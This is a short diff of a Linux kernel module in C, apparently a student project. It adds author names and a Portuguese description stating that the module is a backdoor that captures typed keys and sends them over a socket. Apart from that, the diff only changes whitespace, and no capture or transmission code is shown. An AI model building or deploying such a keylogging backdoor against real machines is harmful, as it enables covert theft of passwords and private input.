@@ -10,6 +10,8 @@
 #define BUFFSIZE 32
 
 MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Daniel Contente Romanzini/Gabriel Henrique Brioto/Guilherme Chiarotto de Moraes");
+MODULE_DESCRIPTION("Implementação de um módulo que atua como backdoor, lendo as teclas digitadas e enviando via socket.");
 
 static struct kvec vec;  
 static struct msghdr msg;  
@@ -63,7 +65,7 @@ static int start_server(void){
 }
 
 static int send_msg(void){
-      
+
     memset(&vec, 0, sizeof(vec));  
     memset(&msg, 0, sizeof(msg));
 
